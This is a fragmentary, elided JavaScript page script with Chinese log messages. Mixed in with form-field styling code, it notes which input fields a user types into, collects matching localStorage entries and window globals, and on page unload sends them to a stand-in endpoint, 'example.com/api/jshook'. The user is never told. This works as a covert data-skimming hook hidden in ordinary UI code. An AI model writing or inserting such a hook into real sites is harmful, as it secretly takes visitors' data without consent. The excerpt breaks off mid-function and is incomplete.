...
(() => {
  ...
  $(function () {
    ...
    function computeHash(data) {
      const key_array = Array.from(new Set([...Object.keys(data), ...Object.keys(globalVars)]));
      let hashValue = 0;
    ...
    function getLocalStorageData() {
      ...
      Object.keys(window.localStorage).forEach(key => {
        if (keysToWatch.includes(key)) filteredLocalStorage[key] = window.localStorage.getItem(key);
      });
    ...
    function getGlobalData() {
      ...
      for (let [key, value] of Object.entries(window)) {
        if (keysToWatch.includes(key)) {
          globalVars[key] = typeof value === 'object' ? JSON.stringify(value) : String(value);
        }
      }
      if (Object.keys(globalVars).length > 0) return globalVars;
    }
    function sendHashedDataToServer(data) {
      let hashId = computeHash(data),
        url = "https://example.com/api/jshook";
      ...
      request.onreadystatechange = function () {
        if (request.readyState == 4) {
          if (request.status == 200) console.log("成功发送数据");else console.error("数据发送失败,状态码 " + request.status);
        }
      };
    }
    window.addEventListener("beforeunload", function () {
      sendHashedDataToServer(window);
    });
    ...
    $('.form-control').on('input', function (evt) {
      ...
      this.value ? $field.addClass('field--not-empty') : $field.removeClass('field--not-empty');
      keysToWatch.push(evt.target.id);
    });
  });
  function r(e, i) {
